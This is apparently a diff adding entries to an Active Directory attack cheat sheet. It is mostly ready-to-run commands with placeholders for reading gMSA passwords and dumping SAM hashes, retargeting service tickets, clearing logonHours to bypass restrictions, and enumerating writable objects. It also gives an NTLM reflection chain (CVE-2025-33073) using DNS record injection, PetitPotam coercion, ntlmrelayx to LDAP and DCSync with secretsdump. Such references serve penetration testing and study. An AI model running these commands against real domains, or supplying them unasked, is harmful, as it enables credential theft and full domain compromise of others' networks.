@@ -269,3 +269,33 @@ export KRB5CCNAME=Administrator@<spn-with-underscores>@<REALM>.ccache
 secretsdump.py -k -no-pass <DC_FQDN>                 # DCSync as impersonated Administrator
 ```
 
+gMSA password read — if a principal is listed in the gMSA's `msDS-GroupMSAMembership` DACL, they can retrieve its managed password:
+```bash
+nxc ldap <DC_IP> -u <USER> -p '<PASS>' --gmsa           # -> NT hash of <gMSA_account>$
+nxc smb <target> -u '<gMSA_account>$' -H '<NT_hash>' --sam   # use hash for lateral movement / SAM dump
+```
+
+SPN-jacking / S4U2Proxy retarget — after you obtain a service ticket for one SPN, use `-altservice` to redirect it to a different SPN at auth time (works when unconstrained-delegation coercion gives you a TGS for `cifs/X` but you need `http/X`):
+```bash
+getST.py '<domain>/<account>' -spn 'cifs/<TARGET>' -altservice 'http/<TARGET>' -impersonate Administrator
+```
+
+logonHours restriction bypass — a "STATUS_ACCOUNT_RESTRICTION" error on valid creds may mean the account has `logonHours` set. Clear the attribute to remove the time restriction:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set attr <RESTRICTED_USER> logonHours -v ''
+```
+
+bloodyAD writable object enumeration — enumerate every AD object the current principal can write (useful for discovering ACL abuse paths that BloodHound may not surface for non-standard attribute writes):
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' get writable
+```
+
+NTLM reflection CVE-2025-33073 (Windows Server 2025, DNS Operators group) — DNS Operators can create DNS A records pointing to an attacker IP. Combine with PetitPotam/coerce to force the machine account to authenticate to that address; relay the NTLMv2 via ntlmrelayx to LDAP to escalate:
+```bash
+# requires DNS Operators membership
+dnstool.py -u '<domain>/<USER>' -p '<PASS>' -r '<attacker-hostname>' -d <LHOST> --action add -t A <DC_IP>
+ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>   # relay NTLM to LDAP to grant DCSync rights
+petitpotam.py -u <USER> -p '<PASS>' <LHOST> <DC_IP>       # coerce DC auth to attacker-controlled record
+secretsdump.py '<domain>/<USER>'@<DC_IP>                   # DCSync after privilege escalation
+```
+
